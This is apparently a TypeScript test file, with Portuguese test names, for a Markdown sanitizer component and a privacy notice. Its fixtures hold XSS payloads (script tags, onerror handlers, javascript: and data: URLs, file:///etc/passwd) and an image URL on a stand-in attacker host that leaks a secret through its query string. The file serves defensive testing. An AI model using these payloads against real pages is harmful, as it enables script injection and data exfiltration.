import assert from "node:assert/strict";
import { test } from "node:test";
import { renderToStaticMarkup } from "react-dom/server";
import { PrivacyNotice } from "./PrivacyNotice";
import { SafeMarkdown, safeUrl } from "./SafeMarkdown";

const render = (md: string) => renderToStaticMarkup(<SafeMarkdown>{md}</SafeMarkdown>);

test("HTML cru aparece como TEXTO e não vira elemento", () => {
  const out = render("<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n<a href=\"javascript:alert(1)\">x</a>");
  assert.ok(!/<script/i.test(out), "sem <script>");
  assert.ok(!/<img/i.test(out), "sem <img>");
  assert.ok(!/onerror=/i.test(out.replace(/&lt;[^&]*?&gt;/g, "")), "sem atributo de evento fora do texto escapado");
  assert.ok(out.includes("&lt;script&gt;alert(1)&lt;/script&gt;"), "o texto do ataque fica visível, escapado");
});

test("javascript: e outros protocolos perigosos não viram link", () => {
  for (const url of ["javascript:alert(1)", "JaVaScRiPt:alert(1)", "data:text/html,<script>alert(1)</script>", "vbscript:x", "file:///etc/passwd", "//evil.example"]) {
    const out = render(`[clique](${url})`);
    assert.ok(!/<a[ >]/.test(out), `sem <a> para ${url}`);
    assert.ok(out.includes("clique"), "o texto do link continua");
  }
});

test("imagens são bloqueadas: nada de <img> nem pré-carregamento (vazamento de dados por URL)", () => {
  const out = render("![espião](https://evil.example/?dados=segredo)\n\n![](https://evil.example/x.png)");
  assert.ok(!/<img/i.test(out), "sem <img>");
  assert.ok(!out.includes("<link"), "sem <link rel=preload>");
  assert.ok(!out.includes("evil.example"), "a URL do atacante nem chega ao HTML");
  assert.ok(out.includes("[imagem: espião]"));
});

test("links http, https e mailto funcionam e abrem de forma segura", () => {
  const out = render("[a](https://example.com/p?x=1) [b](http://example.com) [c](mailto:oi@example.com)");
  assert.equal((out.match(/<a /g) ?? []).length, 3);
  assert.equal((out.match(/rel="noopener noreferrer nofollow"/g) ?? []).length, 3);
  assert.equal((out.match(/target="_blank"/g) ?? []).length, 3);
  assert.equal(safeUrl("https://x.com"), "https://x.com");
  assert.equal(safeUrl("  javascript:alert(1)"), "");
});

test("Markdown normal e GFM renderizam (negrito, lista, tabela, código)", () => {
  const out = render("**forte** e ~~riscado~~\n\n- um\n- dois\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```\n<script>x</script>\n```");
  assert.match(out, /<strong>forte<\/strong>/);
  assert.match(out, /<del>riscado<\/del>/);
  assert.equal((out.match(/<li/g) ?? []).length, 2);
  assert.match(out, /<table/);
  assert.match(out, /<th[^>]*>a<\/th>/);
  assert.ok(!/<script/i.test(out), "código também é escapado");
});

test("não gera h1: os títulos do conteúdo não competem com os da página", () => {
  const out = render("# Título\n\n## Sub");
  assert.ok(!/<h[1-6]/.test(out));
  assert.match(out, /role="heading"/);
});

test("aviso de privacidade dos uploads cita os provedores e aponta para /privacidade", () => {
  const out = renderToStaticMarkup(<PrivacyNotice />);
  for (const p of ["Anthropic", "OpenAI", "Google"]) assert.ok(out.includes(p), p);
  assert.match(out, /href="\/privacidade"/);
  assert.match(out, /dados pessoais sensíveis/);
});
